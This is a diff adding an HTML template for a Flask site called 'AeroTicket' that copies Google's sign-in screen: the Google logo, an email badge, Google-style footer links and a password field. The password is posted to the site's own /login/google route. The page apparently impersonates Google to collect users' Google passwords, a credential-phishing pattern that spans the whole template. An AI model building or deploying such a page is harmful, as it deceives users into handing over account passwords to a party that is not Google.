@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome - AeroTicket</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="{{ url_for('static', filename='google_log.css') }}">
+
+</head>
+<body>
+
+<div class="container">
+    <div class="left-panel">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="48" style="margin-bottom:20px;">
+        <h1>Welcome</h1>
+        <a href="{{ url_for('login') }}" class="email-badge">
+            <span style="margin-right:8px;">👤</span> {{ email }} <span style="font-size: 10px; margin-left: 4px;">▼</span>
+        </a>
+    </div>
+    <div class="right-panel">
+       <form action="/login/google" method="POST">
+    <input type="hidden" name="step" value="password">
+    <input type="hidden" name="email" value="{{ email }}"> <input type="password" name="password" placeholder="Enter your password" required>
+    
+    <button type="submit" class="next-btn">Sign In</button>
+</form>
+    </div>
+</div>
+
+<div class="footer">
+    <div>English (United States) ▼</div>
+    <div style="display:flex; gap:24px;">
+        <span style="cursor:pointer">Help</span>
+        <span style="cursor:pointer">Privacy</span>
+        <span style="cursor:pointer">Terms</span>
+    </div>
+</div>
+
+</body>
+</html>
